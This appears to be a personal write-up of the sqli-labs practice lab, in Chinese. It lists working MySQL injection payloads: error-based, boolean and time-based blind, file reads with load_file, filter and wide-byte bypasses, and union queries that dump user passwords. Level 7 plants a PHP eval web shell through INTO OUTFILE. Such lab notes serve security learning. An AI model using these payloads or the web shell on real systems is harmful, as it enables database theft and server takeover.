# Sql-labs记录

记录了一些sql-labs的闯关历史

- 随记
version()——MySQL 版本
user()——数据库用户名
database()——数据库名
@@datadir——数据库路径
@@version_compile_os——操作系统版本
information_schema 自带数据库
information_schema.schemata 数据库
information_schema.tables 数据表
information_schema.columns 数据列
floor函数返回小于等于该值的最大整数
RAND()函数调用可以在0和1之间产生一个随机数

- 报错注入：

```
rand()
```
![](https://pic.superbed.cn/item/5dcbf1df8e0e2e3ee9eb629e.jpg)
```
floor()
```
![](https://pic.superbed.cn/item/5dcbf31c8e0e2e3ee9eb8939.jpg)

```
and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a)

and (select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2))) -- +
```
```
1' and updatexml(1,user(),1) --+
只有在payload返回的不是xml格式才会生效,其最长输出32位
```
```
extractvalue(1,concat('~',user(),'~'))
其最长输出32位
```

简化
```
select count(*) from information_schema.tables group by concat(version(), floor(rand(0)*2))
```
关键表被禁用
```
select count(*) from (select 1 union select null union
select !1)a group by concat(version(),floor(rand(0)*2))
```
rand 禁用
```
select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)
```

exp
```
select exp(~(select * FROM(SELECT USER())a))
```

mysql重复性
```
select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
```
- 布尔注入

```
left(database(),1)>'s'

截取数据库第一位
```

```
ascii(substr((select table_name information_schema.tables where tables_schema =database()limit 0,1),1,1))=101 --+
```
```
substr(a,b,c) 从b位置开始，截取字符串a的c长度
```
```
ascii() 将某个字符转为ascii值
```
```
ascii(substr(select database()),1,1)=98
```
```
ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))>98%23
```
```
mid(a,b,c) 从位置b开始，街区a字符床的c位
```
```
ord()同ascii()，将字符串转为ascii值
```

regexp 正则注入

```
select user() regexp '^[a-z]';

select user() regexp '^ro'

I select * from users where id=1 and 1=(if((user() regexp '^r'),1,0));

select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^us[a-z]' limit 0,1);

```

like 匹配注入

```
select user() like 'root%'
```

- 延时注入

```
If(ascii(substr(database(),1,1))>115,0,sleep(5))%23

UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘M SG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;
```

- 导入导出操作

```
load_file()导出文件

Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92, 114,101,112,97,105,114,92,115,97,109)))

-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105)) 
Explain:“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的 ASCII 代码
-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69) Explain:“c:/boot.ini”的 16 进制是“0x633a2f626f6f742e696e69”
-1 union select 1,1,1,load_file(c:\\boot.ini) Explain:路径里的/用 \\代替

```

```
LOAD DATA INFILE 导入

```


==============================================================================================



- 第一关(联合开始)

```
and 1=1 --+
```

![](https://pic.superbed.cn/item/5dcac5518e0e2e3ee9b94e2b.jpg)

![](https://pic.superbed.cn/item/5dcac66a8e0e2e3ee9b973b3.jpg)

```
id=-1' union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+
```
![](https://pic.superbed.cn/item/5dcac88c8e0e2e3ee9b9be2c.jpg)

```
id=-1' union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=database()) --+
```
![](https://pic.superbed.cn/item/5dcaca668e0e2e3ee9ba4663.jpg)

```
id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users') --+
```
![](https://pic.superbed.cn/item/5dcacb248e0e2e3ee9ba661c.jpg)

```
id=-1' union select 1,2,(select group_concat(password) from users) --+
```
![](https://pic.superbed.cn/item/5dcacbb18e0e2e3ee9ba7a0c.jpg)

- 第二关

```
id=1 and 1=2
```

- 第三关

```
id=1') and 1=2 
```

- 第四关（联合结束）

```
id=1") and 1=2 --+
```

- 第五关（报错开始）

```
id=1' and (select 1 from (select count(*),concat((user()),floor (rand(0)*2))x from information_schema.tables group by x)a) --+

and(select%201%20from(select%20count(*),concat((select%20(select%20(SELECT%20distinct%20group_concat(0x7e,schema_name,0x7e)%20FROM%20information_schema.schemata%20LIMIT%200,1))%20from%20information_schema.tables%20limit%200,

```
![](https://pic.superbed.cn/item/5dcc06c68e0e2e3ee9ef1fd4.jpg)

![](https://pic.superbed.cn/item/5dcd4a248e0e2e3ee91b878a.jpg)

![](https://pic.superbed.cn/item/5dcd4ab38e0e2e3ee91bab9f.jpg)

![](https://pic.superbed.cn/item/5dcd4b288e0e2e3ee91bc42f.jpg)

![](https://pic.superbed.cn/item/5dcd4b658e0e2e3ee91bcd68.jpg)


- 第六关

```
id=1" and updatexml(1,concat('~',user(),'~'),1) --+ 
```

- 第五关（盲注）

```
1' and left(version(),1)=5 --+

and length(database()=8) --+

```

![](https://ae01.alicdn.com/kf/Hb883745ed1ce492a884339e7de533bdcx.jpg)

![](https://ae01.alicdn.com/kf/Hf27fa54ffcc54c9984fac57c3f57351c4.jpg)

- 第六关（盲注）
```
1" and left(version(),1)=5 --+
```


- 第七关
```
?id=1'))UNION SELECT 1,2,'<?php @eval($_post[“mima”])?>' into outfile "c:\\wamp\\www\\sqllib\\Less-7\\yijuhua.php"--+
```
![](https://ae01.alicdn.com/kf/H844a3c2b8fde4386aaa6b6c9f3a59e12M.jpg)

- 第八关

```
id=1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+
```

![](https://ae01.alicdn.com/kf/H0112f5ad375745818885eaaa69e7519c5.jpg)

- 第九关

```
id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),1)
```

![](https://ae01.alicdn.com/kf/He5d4b152525840af9d31a17ac0965f5fl.jpg)

- 第十关

```
id=1" and if(ascii(substr(database(),1,1))=115,sleep(5),1) --+
```

![](https://ae01.alicdn.com/kf/H283cf3f0d9274d558c8622a7e1053947J.jpg)

- 第十一关（POST开始）

```
uname=admin
&passwd=-admin' union select 1,(select group_concat(schema_name) from information_schema.schemata) #
&submit=Submit
```
![](https://ae01.alicdn.com/kf/H5ea3fe9be0c44a20abbd27a43601437f9.jpg)

- 第十二关 

```
uname=admin
&passwd=-admin") union select 1,(select group_concat(schema_name) from information_schema.schemata) #
&submit=Submit
```
![](https://ae01.alicdn.com/kf/H76a3d8e0f5f7483783d75d3938a4868a9.jpg)


- 第十三关

```
uname=admin') and ascii(substr((database()),1,1))=115 #
&passwd=admin
&submit=Submit
```

![](https://ae01.alicdn.com/kf/H7cf7e416cd50414da0bd4d927ec2598e3.jpg)


- 第十四关

```
uname=admin" and ascii(substr((database()),1,1))=115 #
&passwd=admin
&submit=Submit

uname=admin" and extractvalue(1,concat('~',user(),'~')) #
&passwd=admin 
&submit=Submit
```

![](https://ae01.alicdn.com/kf/H138b63b56719481f8e6ecfdb7902bedfj.jpg)

- 第十五关

```
uname=admin' and If(ascii(substr(database(),1,1))=115,sleep(5),1) # 
&passwd=admin
&submit=Submit
```

![](https://ae01.alicdn.com/kf/H057e3ebcc50c4386aaa68898a933fa0eT.jpg)

- 第十六关

```
uname=admin") and If(ascii(substr(database(),1,1))=115,sleep(5),1) #
&passwd=admin
&submit=Submit
```
![](https://ae01.alicdn.com/kf/H129bf1d2fe4246f68de6962c995e294dY.jpg)

- 第十七关

```
uname=admin
&passwd=admin' and extractvalue(1,concat('~',user(),'~')) #
&submit=Submit
```
![](https://ae01.alicdn.com/kf/Hd47a227a58c84e20acf91d1f3a11f1322.jpg)

- 第十八关

```
'and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1
```

- 第十九关

```
'and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1
```

- 第二十关

![](https://ae01.alicdn.com/kf/H2875b8c3ca7244b7828d6e8714c5b565e.jpg)

```
cookies:Dumb' and extractvalue(1,concat('~',user(),'~')) #
```
![](https://ae01.alicdn.com/kf/Hee729c1c85a043db827212c2bb15d788l.jpg)

- 第二十一关

![](https://ae01.alicdn.com/kf/Hea1fb581ac37430ab72b0596e12c06e51.jpg)

```
YWRtaW4xJylhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQGJhc2 VkaXIpLDB4N2UpKSM=
```

![](https://ae01.alicdn.com/kf/H542cd58a78364287877a84227429999eu.jpg)

- 第二十二关

```
admin1"and extractvalue(1,concat(0x7e,(select database()),0x7e))#
```

![](https://ae01.alicdn.com/kf/H542cd58a78364287877a84227429999eu.jpg)

- 第二十三关(基于错误无注释)

```
?id=1' and extractvalue(1,concat('~',user(),'~')) or '1'='1
```
![](https://ae01.alicdn.com/kf/Hc9f4864827fe4086a0f440d15a2aa6d7x.jpg)

- 第二十四关(二次注入)

![](https://ae01.alicdn.com/kf/Hdc7d9dc8d5f74cdab476c7fb9fc814eej.jpg)

![](https://ae01.alicdn.com/kf/H2fbe6413ca9c4a7e8d77577d9d51a104J.jpg)

- 第二十五关(过滤or、and）
1. 大小写:Or,OR,oR
2. 编码,hex,urlencode
3. 添加注释/*or*/
4. 利用符号 and=&&  or=||

```
id=1'|| extractvalue(1,concat(0x7e,database()))--+
```
![](https://ae01.alicdn.com/kf/H33c0681536194843a0d48bf092dde652D.jpg)

![](https://ae01.alicdn.com/kf/H6d74de1b63b64f6da9045d253ac494c9J.jpg)

-第二十六关 (过滤空格)

```
id=-1'%0a%26%26'1'='2
```
![](https://ae01.alicdn.com/kf/H2137712309e04214a4b403d39613d3bc1.jpg)

-第二十七关(过滤SELECT & UNION)

```
id=-1'%0a%26%26'1'='1
index.php?id=100'%0aUNion%0aSelEcT%0a1,database(),3%0a%26%26'1
```

![](https://ae01.alicdn.com/kf/H7757307c920641918df46f8637f172a51.jpg)

-第二十八关(过滤SELECT & UNION)

```
id=1'%0aand%0a1=2%26%26'1

```

- 第三十二关（宽子节开始）

![](https://ae01.alicdn.com/kf/Hd7b8e60d6670401a9ffb075b4c8bbaf2C.jpg)

```
id=-1%df' union select 1,user(),3 --+
```
![](https://ae01.alicdn.com/kf/H7874e5c67d75461d8ef6d79d418acf09R.jpg)

- 第三十三关

```
id=-1%df' union select 1,user(),3 --+
```

![](https://ae01.alicdn.com/kf/H60628454ea6d4c918a898c99d6cc02dcW.jpg)